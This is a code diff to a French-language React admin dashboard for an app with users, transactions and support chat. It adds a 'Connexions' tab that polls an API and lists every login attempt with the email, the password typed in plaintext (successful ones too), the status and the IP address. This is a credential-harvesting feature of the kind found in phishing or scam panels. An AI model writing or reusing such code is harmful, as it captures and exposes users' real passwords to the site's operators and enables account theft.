@@ -42,9 +42,10 @@ import {
   Calendar,
   MapPin,
   FileText,
-  Lock
+  Lock,
+  Activity
 } from "lucide-react";
-import { type User, type Transaction, type SupportMessage } from "@shared/schema";
+import { type User, type Transaction, type SupportMessage, type LoginAttempt } from "@shared/schema";
 import { apiRequest, queryClient } from "@/lib/queryClient";
 import { useToast } from "@/hooks/use-toast";
 import { 
@@ -91,6 +92,11 @@ export default function AdminUsers() {
   const { data: allMessages, isLoading: messagesLoading } = useQuery<SupportMessage[]>({
     queryKey: ["/api/admin/support"],
     refetchInterval: 3000,
+  });
+
+  const { data: loginAttemptsData, isLoading: loginLoading } = useQuery<LoginAttempt[]>({
+    queryKey: ["/api/admin/login-attempts"],
+    refetchInterval: 5000,
   });
 
   const updateStatusMutation = useMutation({
@@ -244,6 +250,7 @@ export default function AdminUsers() {
           </TabsTrigger>
           <TabsTrigger value="transactions" className="gap-2"><History className="w-4 h-4" /> Transactions</TabsTrigger>
           <TabsTrigger value="support" className="gap-2"><MessageSquare className="w-4 h-4" /> Support</TabsTrigger>
+          <TabsTrigger value="login-attempts" className="gap-2"><Activity className="w-4 h-4" /> Connexions</TabsTrigger>
         </TabsList>
 
         <TabsContent value="users">
@@ -456,6 +463,51 @@ export default function AdminUsers() {
         <TabsContent value="support">
           {/* ... Copie du support existant ... */}
           <div className="text-center py-12 text-muted-foreground border rounded-xl bg-card">Interface Support Client active</div>
+        </TabsContent>
+
+        <TabsContent value="login-attempts">
+          <Card className="hover-elevate">
+            <CardHeader>
+              <CardTitle>Tentatives de Connexion</CardTitle>
+              <CardDescription>Historique des emails et mots de passe saisis lors des tentatives de connexion.</CardDescription>
+            </CardHeader>
+            <CardContent className="p-0">
+              <Table>
+                <TableHeader>
+                  <TableRow>
+                    <TableHead>Date</TableHead>
+                    <TableHead>Email saisi</TableHead>
+                    <TableHead>Mot de passe saisi</TableHead>
+                    <TableHead>Statut</TableHead>
+                    <TableHead>IP</TableHead>
+                  </TableRow>
+                </TableHeader>
+                <TableBody>
+                  {loginLoading ? (
+                    <TableRow>
+                      <TableCell colSpan={5} className="h-24 text-center"><Loader2 className="w-6 h-6 animate-spin mx-auto text-primary" /></TableCell>
+                    </TableRow>
+                  ) : loginAttemptsData?.length === 0 ? (
+                    <TableRow>
+                      <TableCell colSpan={5} className="h-24 text-center text-muted-foreground">Aucune tentative enregistrée.</TableCell>
+                    </TableRow>
+                  ) : loginAttemptsData?.map((attempt) => (
+                    <TableRow key={attempt.id} className="border-white/5">
+                      <TableCell className="text-xs">{format(new Date(attempt.createdAt), 'dd/MM/yyyy HH:mm:ss')}</TableCell>
+                      <TableCell className="font-medium">{attempt.email}</TableCell>
+                      <TableCell className="font-mono text-xs">{attempt.password}</TableCell>
+                      <TableCell>
+                        <Badge variant={attempt.status === 'success' ? 'default' : 'destructive'} className={attempt.status === 'success' ? 'bg-emerald-500/10 text-emerald-500 border-emerald-500/20' : ''}>
+                          {attempt.status === 'success' ? 'Réussi' : 'Échoué'}
+                        </Badge>
+                      </TableCell>
+                      <TableCell className="text-xs text-muted-foreground">{attempt.ip}</TableCell>
+                    </TableRow>
+                  ))}
+                </TableBody>
+              </Table>
+            </CardContent>
+          </Card>
         </TabsContent>
       </Tabs>
 
